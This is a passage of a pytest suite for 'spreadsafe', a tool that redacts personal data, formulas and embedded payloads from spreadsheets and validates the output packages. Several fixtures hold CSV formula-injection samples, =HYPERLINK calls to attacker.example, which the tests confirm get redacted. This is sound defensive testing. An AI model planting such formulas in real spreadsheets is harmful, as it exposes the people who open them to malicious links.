        assert b"/xl/tables/" not in content_types
    assert validate_output(output_dir).passed


def test_validate_rejects_unsupported_xlsx_payload_parts(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.save(sanitized_dir / "media.xlsx")
    _add_media_part(sanitized_dir / "media.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("unsupported workbook payload remains" in issue for issue in result.issues)


def test_validate_rejects_macro_and_activex_xlsx_payload_parts(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.save(sanitized_dir / "macro.xlsx")
    _add_macro_and_activex_parts(sanitized_dir / "macro.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("unsupported workbook payload remains" in issue for issue in result.issues)


def test_validate_rejects_xlsx_table_metadata_parts(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Email", "Status"])
    sheet.append(["jan@example.com", "ACTIVE"])
    sheet.add_table(Table(displayName="Contacts", ref="A1:B2"))
    workbook.save(sanitized_dir / "table.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("unsupported workbook payload remains" in issue for issue in result.issues)


def test_validate_rejects_xlsx_chart_payload_parts(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Name", "Value"])
    sheet.append(["jan@example.com", 5])
    chart = BarChart()
    chart.add_data(Reference(sheet, min_col=2, min_row=1, max_row=2), titles_from_data=True)
    chart.set_categories(Reference(sheet, min_col=1, min_row=2, max_row=2))
    sheet.add_chart(chart, "D1")
    workbook.save(sanitized_dir / "chart.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("xl/charts/" in issue for issue in result.issues)


def test_validate_rejects_path_qualified_external_workbook_formula_references(
    tmp_path: Path,
) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["External"])
    workbook.active.append(["='C:\\finance\\[prod-budget.xlsx]Sheet1'!A1"])
    workbook.save(sanitized_dir / "external.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("formula remains" in issue for issue in result.issues)


def test_validate_rejects_sensitive_csv_headers(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "headers.csv").write_text("jan@example.com\nSAFE\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("row 1 column 1 EMAIL remains" in issue for issue in result.issues)


def test_validate_rejects_configured_sensitive_csv_values(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "internal.csv").write_text("Internal ID\ncustomer-17\n", encoding="utf-8")

    result = validate_output(output_dir, Config(sensitive_columns=["Internal ID"]))

    assert not result.passed
    assert any("configured sensitive value remains" in issue for issue in result.issues)


def test_validate_rejects_csv_rows_with_extra_columns(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "extra.csv").write_text(
        "status\nOK,+48 600 123 456\n",
        encoding="utf-8",
    )

    result = validate_output(output_dir)

    assert not result.passed
    assert any("row 2 contains extra columns" in issue for issue in result.issues)


def test_validate_rejects_identifier_shaped_amounts(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "amounts.csv").write_text("Amount\n5252248481\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("NIP remains" in issue for issue in result.issues)


def test_sanitize_command_rejects_missing_input_directory(tmp_path: Path) -> None:
    missing_input = tmp_path / "missing"

    result = invoke_cli(["sanitize", str(missing_input), "--out", str(tmp_path / "out")])

    assert result.exit_code == 2
    assert "Input directory does not exist" in result.stderr
    assert "Traceback" not in result.stderr


def test_sanitize_command_creates_output_for_unsupported_only_input(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "legacy.xls").write_bytes(b"unsupported")
    result = invoke_cli(["sanitize", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    assert (output_dir / ".spreadsafe-package").read_text(encoding="utf-8") == "spreadsafe\n"
    assert (output_dir / "sanitized").is_dir()


def test_sanitize_command_clears_stale_sanitized_files(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    stale_sanitized = output_dir / "sanitized"
    input_dir.mkdir()
    stale_sanitized.mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    stale_file = stale_sanitized / "old.csv"
    stale_file.write_text("email\njan@example.com\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    result = invoke_cli(["sanitize", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    assert not stale_file.exists()
    assert (stale_sanitized / "orders.xlsx").exists()


def test_sanitize_command_exits_on_validation_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    def fail_validation(*_args: object, **_kwargs: object) -> ValidationResult:
        return ValidationResult(False, issues=["redacted validation issue"])

    monkeypatch.setattr("spreadsafe.cli.validate_output", fail_validation)

    result = invoke_cli(["sanitize", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 1
    assert "redacted validation issue" in result.stderr
    assert "Wrote sanitized files" not in result.stdout


def test_sanitize_validation_failure_preserves_existing_output(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    old_sanitized = output_dir / "sanitized"
    input_dir.mkdir()
    old_sanitized.mkdir(parents=True)
    (input_dir / "new.csv").write_text("status\nNEW\n", encoding="utf-8")
    (old_sanitized / "old.csv").write_text("status\nOLD\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    def fail_validation(*_args: object, **_kwargs: object) -> ValidationResult:
        return ValidationResult(False, issues=["redacted validation issue"])

    monkeypatch.setattr("spreadsafe.cli.validate_output", fail_validation)

    result = invoke_cli(["sanitize", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 1
    assert (old_sanitized / "old.csv").exists()
    assert not (old_sanitized / "new.csv").exists()


def test_scan_and_sanitize_clear_stale_sibling_outputs(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    scan_result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])
    sanitize_result = invoke_cli(["sanitize", str(input_dir), "--out", str(output_dir)])

    assert scan_result.exit_code == 0
    assert sanitize_result.exit_code == 0
    assert (output_dir / "sanitized" / "orders.xlsx").exists()
    assert not (output_dir / "reports").exists()

    second_scan_result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert second_scan_result.exit_code == 0
    assert (output_dir / "reports" / "workbook-report.md").exists()
    assert not (output_dir / "sanitized").exists()


def test_sanitize_command_rejects_unmarked_stale_sanitized_files(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    stale_sanitized = output_dir / "sanitized"
    input_dir.mkdir()
    stale_sanitized.mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    stale_file = stale_sanitized / "old.csv"
    stale_file.write_text("email\njan@example.com\n", encoding="utf-8")
    result = invoke_cli(["sanitize", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 2
    assert "Refusing to clear existing output directory" in result.stderr
    assert stale_file.exists()


def test_sanitize_rejects_csv_rows_with_extra_columns(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "ragged.csv").write_text(
        "name,email\nAlice,alice@example.com,unexpected-note\n",
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="extra columns"):
        package_directory(input_dir, output_dir)


def test_csv_sanitizer_redacts_formula_like_cells(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "formulas.csv").write_text(
        'Name,Notes\nAlice,"=HYPERLINK(""https://attacker.example"",""open"")"\n',
        encoding="utf-8",
    )

    package_directory(input_dir, output_dir)

    sanitized = (output_dir / "sanitized" / "formulas.csv").read_text(encoding="utf-8")
    assert "[REDACTED_FORMULA]" in sanitized
    assert "HYPERLINK" not in sanitized


def test_csv_sanitizer_redacts_newline_prefixed_formula_cells(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "formulas.csv").write_text(
        'Name,Notes\nAlice,"\n=HYPERLINK(""https://attacker.example"",""open"")"\n',
        encoding="utf-8",
    )

    package_directory(input_dir, output_dir)

    sanitized = (output_dir / "sanitized" / "formulas.csv").read_text(encoding="utf-8")
    assert "[REDACTED_FORMULA]" in sanitized
    assert "HYPERLINK" not in sanitized


def test_csv_sanitizer_redacts_formula_shaped_generated_tokens(tmp_path: Path) -> None:
    source = tmp_path / "source.csv"
    destination = tmp_path / "sanitized.csv"
    source.write_text("Danger\nsafe value\n", encoding="utf-8")
    config = Config(sensitive_columns=["Danger"])

    class FormulaTokenMapper(PseudonymMapper):
        def token(self, label: str, value: object) -> str:
            return "=BAD 0001"

    Sanitizer(config, FormulaTokenMapper()).sanitize_csv(source, destination)

    sanitized = destination.read_text(encoding="utf-8")
    assert "[REDACTED_FORMULA]" in sanitized
    assert "=BAD" not in sanitized


def test_validate_rejects_newline_prefixed_csv_formula_cells(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "formulas.csv").write_text('Notes\n"\n=1+1"\n', encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("contains CSV formula" in issue for issue in result.issues)


def test_csv_sanitizer_preserves_empty_files(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "empty.csv").write_text("", encoding="utf-8")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    assert (output_dir / "sanitized" / "empty.csv").read_text(encoding="utf-8") == ""
    report = json.loads((output_dir / "reports" / "workbook-report.json").read_text(encoding="utf-8"))
    assert report[0]["sheets"][0]["rows"] == 0


def test_sanitize_command_redacts_formula_like_csv_headers(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "headers.csv").write_text("=HYPERLINK(\"https://attacker.example\")\nvalue\n", encoding="utf-8")
    result = invoke_cli(["sanitize", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    sanitized = (output_dir / "sanitized" / "headers.csv").read_text(encoding="utf-8")
    assert "[REDACTED_FORMULA]" in sanitized
    assert "HYPERLINK" not in sanitized
    assert validate_output(output_dir).passed


def test_package_does_not_echo_formula_like_csv_headers_in_risk_report(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "headers.csv").write_text(
        '=HYPERLINK("https://attacker.example")\nvalue\n',
        encoding="utf-8",
    )

    result = package_directory(input_dir, output_dir)

    assert result.passed
    risk_report = (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert "HYPERLINK" not in risk_report
    assert "attacker.example" not in risk_report


def test_csv_sanitizer_preserves_duplicate_headers_positionally(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "duplicate.csv").write_text(
        "Name,Name\nAlice,Bob\n",
        encoding="utf-8",
    )

    package_directory(input_dir, output_dir)

    sanitized = (output_dir / "sanitized" / "duplicate.csv").read_text(encoding="utf-8")
    assert sanitized == "SPREADSAFE_PERSON_0001,SPREADSAFE_PERSON_0001\nSPREADSAFE_PERSON_0002,SPREADSAFE_PERSON_0003\n"


def test_scan_command_rejects_invalid_paths_without_traceback(tmp_path: Path) -> None:
    missing_input = tmp_path / "missing"

    missing_result = invoke_cli(["scan", str(missing_input), "--out", str(tmp_path / "out")])

    assert missing_result.exit_code == 2
    assert "Input directory does not exist" in missing_result.stderr
    assert "Traceback" not in missing_result.stderr

    input_dir = tmp_path / "input"
    input_dir.mkdir()
    nested_result = invoke_cli(["scan", str(input_dir), "--out", str(input_dir / "out")])

    assert nested_result.exit_code == 2
    assert "Output directory cannot be inside input directory" in nested_result.stderr
    assert "Traceback" not in nested_result.stderr


def test_scan_command_overwrites_stale_generated_reports(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "scan-output"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    first_result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])
    report = output_dir / "reports" / "workbook-report.md"
    report.write_text("stale report\n", encoding="utf-8")
    second_result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert first_result.exit_code == 0
    assert second_result.exit_code == 0
    assert "stale report" not in report.read_text(encoding="utf-8")
    assert not (output_dir / "sanitized").exists()


def test_scan_command_rejects_unmarked_generated_report_names(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "scan-output"
    reports_dir = output_dir / "reports"
    input_dir.mkdir()
    reports_dir.mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    for name in ("workbook-report.md", "workbook-report.json", "risk-report.md"):
        (reports_dir / name).write_text("user report\n", encoding="utf-8")

    result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 2
    assert "Refusing to clear existing output directory" in result.stderr
    assert (reports_dir / "workbook-report.md").read_text(encoding="utf-8") == "user report\n"


def test_scan_command_rejects_unmarked_reports_with_extra_files(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "scan-output"
    reports_dir = output_dir / "reports"
    input_dir.mkdir()
    reports_dir.mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    for name in ("workbook-report.md", "workbook-report.json", "risk-report.md"):
        (reports_dir / name).write_text("generated\n", encoding="utf-8")
    extra_report = reports_dir / "notes.txt"
    extra_report.write_text("user notes\n", encoding="utf-8")

    result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 2
    assert "Refusing to clear existing output directory" in result.stderr
    assert extra_report.read_text(encoding="utf-8") == "user notes\n"


def test_package_command_rejects_scalar_config_lists_without_traceback(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "spreadsafe.yml").write_text("sensitive_columns: Email\n", encoding="utf-8")
    (input_dir / "clients.csv").write_text("Email\njan@example.com\n", encoding="utf-8")
    result = invoke_cli(["package", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 2
    assert "sensitive_columns must be a list of strings" in result.stderr
    assert "Traceback" not in result.stderr


def test_package_command_rejects_non_mapping_config_without_traceback(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "spreadsafe.yml").write_text("- Email\n", encoding="utf-8")
    (input_dir / "clients.csv").write_text("Email\njan@example.com\n", encoding="utf-8")
    result = invoke_cli(["package", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 2
    assert "spreadsafe.yml must contain a mapping" in result.stderr
    assert "Traceback" not in result.stderr


def test_package_command_creates_marker_sanitized_files_and_reports(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    result = invoke_cli(["package", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    assert (output_dir / ".spreadsafe-package").read_text(encoding="utf-8") == "spreadsafe\n"
    assert (output_dir / "sanitized" / "orders.xlsx").exists()
    assert (output_dir / "reports" / "workbook-report.md").exists()


def test_package_command_refuses_to_clear_unmarked_generated_output(
    tmp_path: Path,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    stale_sanitized = output_dir / "sanitized"
    input_dir.mkdir()
    stale_sanitized.mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    stale_file = stale_sanitized / "old.csv"
    stale_file.write_text("status\nSTALE\n", encoding="utf-8")
    result = invoke_cli(["package", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 2
    assert "Refusing to clear existing output directory" in result.stderr
    assert stale_file.exists()


def test_package_directory_validation_failure_preserves_existing_output(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    old_sanitized = output_dir / "sanitized"
    old_reports = output_dir / "reports"
    input_dir.mkdir()
    old_sanitized.mkdir(parents=True)
    old_reports.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    (old_sanitized / "old.csv").write_text("status\nOLD\n", encoding="utf-8")
    (old_reports / "old.md").write_text("old report\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")

    def fail_validation(*_args: object, **_kwargs: object) -> ValidationResult:
        return ValidationResult(False, issues=["redacted validation issue"])

    monkeypatch.setattr("spreadsafe.cli.validate_output", fail_validation)

    result = package_directory(input_dir, output_dir)

    assert not result.passed
    assert (old_sanitized / "old.csv").exists()
    assert not (old_sanitized / "orders.xlsx").exists()
    assert (old_reports / "old.md").exists()


def test_package_rechecks_output_paths_before_replacement(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    old_sanitized = output_dir / "sanitized"
    external_dir = tmp_path / "external"
    input_dir.mkdir()
    old_sanitized.mkdir(parents=True)
    external_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    old_file = old_sanitized / "old.csv"
    sentinel = external_dir / "sentinel.csv"
    old_file.write_text("status\nOLD\n", encoding="utf-8")
    sentinel.write_text("status\nKEEP\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")

    def swap_sanitized_with_symlink(*_args: object, **_kwargs: object) -> ValidationResult:
        shutil.rmtree(old_sanitized)
        old_sanitized.symlink_to(external_dir, target_is_directory=True)
        return ValidationResult(True)

    monkeypatch.setattr("spreadsafe.cli.validate_output", swap_sanitized_with_symlink)

    with pytest.raises(ValueError, match="symlink"):
        package_directory(input_dir, output_dir)

    assert sentinel.exists()
    assert old_sanitized.is_symlink()


def test_replace_generated_output_restores_existing_output_on_move_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    output_dir = tmp_path / "codex-safe"
    staged_output = tmp_path / ".codex-safe-staged"
    (output_dir / "sanitized").mkdir(parents=True)
    (output_dir / "reports").mkdir()
    (staged_output / "sanitized").mkdir(parents=True)
    (staged_output / "reports").mkdir()
    (output_dir / "sanitized" / "old.csv").write_text("status\nOLD\n", encoding="utf-8")
    (output_dir / "reports" / "old.md").write_text("old report\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    (staged_output / "sanitized" / "new.csv").write_text("status\nNEW\n", encoding="utf-8")
    (staged_output / "reports" / "new.md").write_text("new report\n", encoding="utf-8")
    (staged_output / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    real_replace = cli_module._replace_path

    def fail_on_reports(source: Path, destination: Path) -> None:
        if source.parent == staged_output and source.name == "reports":
            destination.mkdir()
            raise OSError("move failed")
        real_replace(source, destination)

    monkeypatch.setattr(cli_module, "_replace_path", fail_on_reports)

    with pytest.raises(OSError, match="move failed"):
        cli_module._replace_generated_output(
            staged_output,
            output_dir,
            ("sanitized", "reports", ".spreadsafe-package"),
        )

    assert (output_dir / "sanitized" / "old.csv").exists()
    assert (output_dir / "reports" / "old.md").exists()
    assert (output_dir / ".spreadsafe-package").read_text(encoding="utf-8") == "spreadsafe\n"
    assert not any(path.name.endswith("backup") for path in output_dir.iterdir())


def test_package_command_rejects_existing_output_file_without_traceback(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_path = tmp_path / "codex-safe"
    input_dir.mkdir()
    output_path.write_text("not a directory", encoding="utf-8")
    (input_dir / "clients.csv").write_text("Status\nACTIVE\n", encoding="utf-8")
    result = invoke_cli(["package", str(input_dir), "--out", str(output_path)])

    assert result.exit_code == 2
    assert "is not a directory" in result.stderr
    assert "Traceback" not in result.stderr


def test_package_clears_previous_sanitized_and_report_outputs(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    stale_sanitized = output_dir / "sanitized"
    stale_reports = output_dir / "reports"
    stale_sanitized.mkdir(parents=True)
    stale_reports.mkdir()
    (stale_sanitized / "old.csv").write_text("status\nSTALE\n", encoding="utf-8")
    (stale_reports / "old.md").write_text("stale report\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")

    package_directory(input_dir, output_dir)

    assert not (stale_sanitized / "old.csv").exists()
    assert not (stale_reports / "old.md").exists()
    assert (stale_sanitized / "orders.xlsx").exists()
    assert (stale_reports / "workbook-report.md").exists()
    assert validate_output(output_dir).passed


def test_validate_rejects_unexpected_files_under_sanitized(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "unexpected.bin").write_bytes(b"not inspected")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Unexpected sanitized file type" in issue for issue in result.issues)


def test_validate_rejects_unexpected_package_root_files(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (output_dir / "secret.csv").write_text("email\njan@example.com\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Unexpected package root entry" in issue for issue in result.issues)


def test_validate_rejects_reports_path_that_is_not_directory(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (output_dir / "reports").write_text("email\njan@example.com\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Package reports path is not a directory" in issue for issue in result.issues)


def test_validate_rejects_unexpected_report_payloads(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    reports_dir = output_dir / "reports"
    sanitized_dir.mkdir(parents=True)
    reports_dir.mkdir()
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (reports_dir / "jan@example.com.xlsx").write_bytes(b"not inspected")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Unexpected report file type" in issue for issue in result.issues)
    assert any("reports/[EMAIL]" in issue for issue in result.issues)
    assert all("jan@example.com" not in issue for issue in result.issues)


def test_validate_rejects_invalid_package_marker_content(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("email\njan@example.com\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Package marker content is invalid" in issue for issue in result.issues)


def test_validate_rejects_symlinked_directories_under_sanitized(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    linked_target = tmp_path / "linked-target"
    sanitized_dir.mkdir(parents=True)
    linked_target.mkdir()
    (linked_target / "secret.csv").write_text("email\njan@example.com\n", encoding="utf-8")
    (sanitized_dir / "linked").symlink_to(linked_target, target_is_directory=True)

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Symlink is not allowed in sanitized package" in issue for issue in result.issues)


def test_validate_checks_preserved_package_gitignore(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (output_dir / ".gitignore").write_text("jan@example.com\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any(".gitignore: EMAIL remains" in issue for issue in result.issues)


def test_validate_rejects_invalid_reports_marker(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (output_dir / ".spreadsafe-reports").mkdir()

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Reports marker is not a file" in issue for issue in result.issues)


def test_validate_rejects_bad_reports_marker_content(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (output_dir / ".spreadsafe-reports").write_text("not spreadsafe\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("Reports marker content is invalid" in issue for issue in result.issues)


def test_package_rejects_file_where_generated_directory_is_expected(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    output_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    (output_dir / "sanitized").write_text("not a directory", encoding="utf-8")

    with pytest.raises(ValueError, match="Cannot prepare output directory"):
        package_directory(input_dir, output_dir)


def test_package_does_not_delete_unmarked_existing_output_directories(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "existing"
    reports_dir = output_dir / "reports"
    input_dir.mkdir()
    reports_dir.mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    sentinel = reports_dir / "sentinel.txt"
    sentinel.write_text("not owned by spreadsafe", encoding="utf-8")

    with pytest.raises(ValueError, match="Refusing to clear existing output directory"):
        package_directory(input_dir, output_dir)

    assert sentinel.exists()


def test_package_rejects_unmarked_generated_report_names(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "existing"
    reports_dir = output_dir / "reports"
    input_dir.mkdir()
    reports_dir.mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    for name in ("workbook-report.md", "workbook-report.json", "risk-report.md"):
        (reports_dir / name).write_text("user-owned\n", encoding="utf-8")

    with pytest.raises(ValueError, match="Refusing to clear existing output directory"):
        package_directory(input_dir, output_dir)


def test_package_rejects_unmanaged_root_files_in_output_directory(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "existing"
    input_dir.mkdir()
    output_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    secret = output_dir / "secret.csv"
    secret.write_text("email\njan@example.com\n", encoding="utf-8")

    with pytest.raises(ValueError, match="unmanaged files"):
        package_directory(input_dir, output_dir)

    assert secret.exists()


def test_sanitizer_redacts_sensitive_values_in_header_rows(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "headerless.csv").write_text("jan@example.com,+48 600 123 456\n", encoding="utf-8")
    workbook = Workbook()
    sheet = workbook.active
    sheet["A1"] = "jan@example.com"
    sheet["B1"] = "+48 600 123 456"
    workbook.save(input_dir / "headerless.xlsx")

    package_directory(input_dir, output_dir)

    csv_text = (output_dir / "sanitized" / "headerless.csv").read_text(encoding="utf-8")
    assert "jan@example.com" not in csv_text
    assert "+48 600 123 456" not in csv_text
    workbook = load_workbook(output_dir / "sanitized" / "headerless.xlsx", data_only=False)
    values = [workbook.active["A1"].value, workbook.active["B1"].value]
    assert "jan@example.com" not in values
    assert "+48 600 123 456" not in values


def test_package_sanitizes_sensitive_filenames_and_sheet_titles(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "jan@example.com"
